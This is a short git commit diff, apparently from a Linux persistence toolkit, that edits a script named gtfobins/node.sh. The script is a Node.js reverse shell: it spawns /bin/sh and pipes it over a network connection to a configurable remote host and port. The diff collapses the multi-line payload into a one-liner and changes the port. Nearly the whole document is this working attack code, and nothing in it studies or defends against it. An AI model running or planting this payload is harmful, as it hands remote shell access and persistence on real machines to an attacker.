049f2c142bd832a689086b884a90679c85adc850
montysecurity <18372298+montysecurity@users.noreply.github.com>
2021-02-02 05:35:28 -0600

    testing

--- gtfobins/node.sh
+++ gtfobins/node.sh
@@ -3,10 +3,5 @@ linper=yes
 #!/bin/bash
 
 export RHOST=0.0.0.0
-export RPORT=12345
-node -e 'sh = require("child_process").spawn("/bin/sh");
-net.connect(process.env.RPORT, process.env.RHOST, function () {
-  this.pipe(sh.stdin);
-  sh.stdout.pipe(this);
-  sh.stderr.pipe(this);
-});'
+export RPORT=5253
+node -e "sh = require(\"child_process\").spawn(\"/bin/sh\");net.connect('$RPORT', '$RHOST', function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});"
